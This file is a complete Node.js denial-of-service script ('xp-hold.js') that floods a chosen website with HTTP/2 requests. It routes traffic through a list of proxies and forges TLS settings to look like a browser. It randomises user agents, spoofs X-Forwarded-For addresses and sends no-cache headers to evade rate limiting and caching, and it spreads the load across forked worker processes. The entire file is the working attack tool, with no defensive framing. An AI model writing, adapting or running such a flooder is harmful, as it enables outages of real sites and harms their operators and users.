const http = require('http');
const tls = require('tls');
const http2 = require('http2');
const fs = require('fs');
const cluster = require('cluster');
const { URL } = require('url');

if (process.argv.length !== 8) {
  console.log('Usage: node xp-hold.js <target> <port> <time> <rate> <threads> <proxy.txt>');
  process.exit(1);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const time = parseInt(process.argv[4]) * 1000;
const rate = parseInt(process.argv[5]);
const threads = parseInt(process.argv[6]);
const proxyList = fs.readFileSync(process.argv[7], 'utf-8').trim().split('\n');

const parsed = new URL(target.startsWith('http') ? target : 'https://' + target);

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
];

function randomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function randomIP() {
  return `${~~(Math.random() * 255)}.${~~(Math.random() * 255)}.${~~(Math.random() * 255)}.${~~(Math.random() * 255)}`;
}

function createTunnel(proxy, cb) {
  const [host, portStr] = proxy.split(':');
  const proxyPort = portStr ? parseInt(portStr) : 8080;

  const req = http.request({
    host,
    port: proxyPort,
    method: 'CONNECT',
    path: `${parsed.hostname}:443`,
    headers: {
      Host: parsed.hostname,
      Connection: 'keep-alive'
    }
  });

  req.on('connect', (res, socket) => {
    const tlsSocket = tls.connect({
      socket,
      servername: parsed.hostname,
      rejectUnauthorized: false,
      ALPNProtocols: ['h2', 'http/1.1'],
      secureContext: tls.createSecureContext({
        ciphers: [
          'TLS_AES_128_GCM_SHA256',
          'TLS_AES_256_GCM_SHA384',
          'TLS_CHACHA20_POLY1305_SHA256',
          'ECDHE-RSA-AES128-GCM-SHA256',
          'ECDHE-RSA-AES256-GCM-SHA384'
        ].join(':'),
        honorCipherOrder: true,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ecdhCurve: 'X25519:P-256:P-384:P-521',
      })
    }, () => cb(null, tlsSocket));
  });

  req.on('error', cb);
  req.end();
}

function sendFlood(socket) {
  const client = http2.connect(parsed.origin, { createConnection: () => socket });
  client.on('error', () => {});
  client.on('close', () => {});

  for (let i = 0; i < rate; i++) {
    const headers = {
      ':method': 'GET',
      ':path': parsed.pathname || '/',
      'user-agent': randomUA(),
      'x-forwarded-for': randomIP(),
      'accept': '*/*',
      'referer': target,
      'origin': parsed.origin,
      'cache-control': 'no-cache',
      'pragma': 'no-cache',
    };

    try {
      const req = client.request(headers);
      req.on('error', () => {});
      req.end();
    } catch (e) {}
  }

  setTimeout(() => client.close(), 3000);
}

function runThread() {
  const endTime = Date.now() + time;

  function loop() {
    if (Date.now() > endTime) return;
    const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
    createTunnel(proxy, (err, socket) => {
      if (!err) sendFlood(socket);
    });
    setTimeout(loop, 100);
  }

  loop();
}

if (cluster.isMaster) {
  console.log(`[XP-HOLD] Target: ${target} | Threads: ${threads} | Time: ${time / 1000}s`);
  for (let i = 0; i < threads; i++) cluster.fork();
  setTimeout(() => {
    console.log('[XP-HOLD] Done.');
    process.exit(0);
  }, time);
} else {
  runThread();
}